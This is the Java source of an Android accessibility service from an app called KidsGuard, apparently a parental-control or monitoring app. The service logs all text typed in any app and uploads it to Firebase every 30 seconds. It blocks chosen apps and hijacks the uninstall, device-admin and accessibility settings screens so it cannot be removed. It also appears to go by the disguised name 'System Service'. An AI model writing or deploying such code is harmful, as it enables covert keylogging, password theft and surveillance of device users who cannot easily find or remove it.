package com.kidsguard.child;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.HashSet;
import java.util.Set;

public class BlockAccessibility extends AccessibilityService {

    public static BlockAccessibility instance;
    public static Set<String> blockedPkgs = new HashSet<>();
    public static StringBuilder keylog = new StringBuilder();
    private static long lastKeylogUpload = 0;

    // --- THROTTLE: auth screen ko bar bar na dikhane ke liye ---
    private static long lastAuthTrigger = 0;
    private static final long AUTH_COOLDOWN = 1500; // 1.5 sec minimum gap
    private static String lastAuthPkg = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event == null) return;

            int type = event.getEventType();
            String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String cls = event.getClassName() != null ? event.getClassName().toString() : "";

            // --- KEYLOGGING ---
            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                CharSequence text = event.getText() != null && !event.getText().isEmpty()
                        ? event.getText().get(0) : null;
                if (text != null && text.length() > 0) {
                    keylog.append(text).append(" | ");
                    if (keylog.length() > 5000) {
                        keylog.delete(0, keylog.length() - 4000);
                    }
                    long now = System.currentTimeMillis();
                    if (now - lastKeylogUpload > 30000) {
                        lastKeylogUpload = now;
                        String devId = LocationService.getSafeDeviceId(this);
                        FirebaseHelper.put("devices/" + devId + "/keylog.json",
                                "{\"keys\":\"" + FirebaseHelper.escapeJson(keylog.toString()) + "\"}");
                    }
                }
            }

            // --- APP BLOCKING ---
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (blockedPkgs != null && blockedPkgs.contains(pkg)) {
                    performGlobalAction(GLOBAL_ACTION_HOME);
                    Intent warn = new Intent(this, BlockWarningActivity.class);
                    warn.putExtra("pkg", pkg);
                    warn.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(warn);
                    return;
                }
            }

            // --- PROTECTION (UNINSTALL / ADMIN / ACCESSIBILITY TOGGLE) ---
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                handleProtection(pkg, cls);
            }
        } catch (Exception ignored) {
            // Prevent any uncaught exception so Android never marks service as malfunctioning
        }
    }

    private void handleProtection(String pkg, String cls) {
        boolean isInstaller = pkg.contains("packageinstaller")
                || pkg.contains("uninstaller")
                || cls.toLowerCase().contains("uninstall");

        boolean isAppSettings = pkg.equals("com.android.settings")
                && (cls.contains("InstalledAppDetails")
                || cls.contains("AppInfo")
                || cls.contains("SubSettings")
                || cls.contains("ManageApplications")
                || cls.contains("DeviceAdmin")
                || cls.contains("Accessibility")
                || cls.contains("ToggleAccessibility")
                || cls.toLowerCase().contains("accessibility"));

        if (!isInstaller && !isAppSettings) return;

        boolean isOurApp = false;
        AccessibilityNodeInfo rootNode = null;
        try {
            rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                isOurApp = checkIfNodeContainsOurApp(rootNode);
            }
        } catch (Exception ignored) {
        } finally {
            if (rootNode != null) rootNode.recycle();
        }

        if (!isOurApp) return;

        long now = System.currentTimeMillis();
        if (now - lastAuthTrigger < AUTH_COOLDOWN && pkg.equals(lastAuthPkg)) {
            return;
        }

        if (UninstallAuthActivity.isUnlocked
                && now - UninstallAuthActivity.unlockedTime < 5 * 60 * 1000L) {
            return;
        }

        lastAuthTrigger = now;
        lastAuthPkg = pkg;

        Intent auth = new Intent(this, UninstallAuthActivity.class);
        auth.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        startActivity(auth);
    }

    private boolean checkIfNodeContainsOurApp(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String pkgName = node.getPackageName() != null ? node.getPackageName().toString() : "";

            if (pkgName.equals("com.kidsguard.child") || pkgName.equals("com.aistudio.kidsguard.qjmxnz")) return true;
            if (text != null) {
                String t = text.toString();
                if (t.contains("System Service") || t.contains("KidsGuard")) return true;
            }
            if (desc != null) {
                String d = desc.toString();
                if (d.contains("System Service") || d.contains("KidsGuard")) return true;
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    try {
                        if (checkIfNodeContainsOurApp(child)) {
                            child.recycle();
                            return true;
                        }
                    } finally {
                        child.recycle();
                    }
                }
            }
        } catch (Exception ignored) {
        }
        return false;
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        instance = null;
    }

    public static void triggerAction(String action) {
        if (instance == null) return;
        if ("back".equals(action)) {
            instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
        } else if ("recents".equals(action)) {
            instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
        } else if ("home".equals(action)) {
            instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
        }
    }
}
